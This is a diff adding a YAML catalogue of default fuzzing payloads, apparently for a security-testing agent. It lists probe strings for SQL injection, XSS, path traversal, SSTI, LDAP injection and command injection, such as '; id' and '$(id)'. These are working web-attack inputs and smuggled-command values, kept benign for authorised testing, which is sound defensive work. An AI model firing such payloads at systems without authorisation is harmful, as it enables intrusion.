@@ -1,0 +1,47 @@
+# Default fuzzing payloads.
+#
+# Each category lists the strings that the fuzzer will try as a value
+# for the target parameter. Keep this file under version control and
+# document the source of any payload added here so reviewers can audit
+# the catalogue.
+#
+# IMPORTANT: payloads are kept conservative and read-only. Anything
+# destructive (DROP, DELETE, rm, format) belongs in a separate
+# explicitly-opt-in catalogue, not the default.
+
+sql_injection:
+  - "' OR '1'='1"
+  - "' OR '1'='1' --"
+  - "1' UNION SELECT NULL--"
+  - "admin' --"
+  - "1 OR 1=1"
+
+xss:
+  - "<script>bounty-agent-probe</script>"
+  - "\"><svg onload=window.bountyAgentProbe>"
+  - "<img src=x onerror=window.bountyAgentProbe>"
+  - "javascript:bountyAgentProbe()"
+
+path_traversal:
+  - "../etc/hostname"
+  - "../../etc/hostname"
+  - "..%2fetc%2fhostname"
+  - "..\\windows\\win.ini"
+
+ssti:
+  - "{{7*7}}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  - "#{7*7}"
+
+ldap_injection:
+  - "*"
+  - "*)(uid=*"
+  - "admin*)(|(uid=*"
+
+command_injection:
+  - "; id"
+  - "| id"
+  - "&& id"
+  - "$(id)"
+  - "`id`"
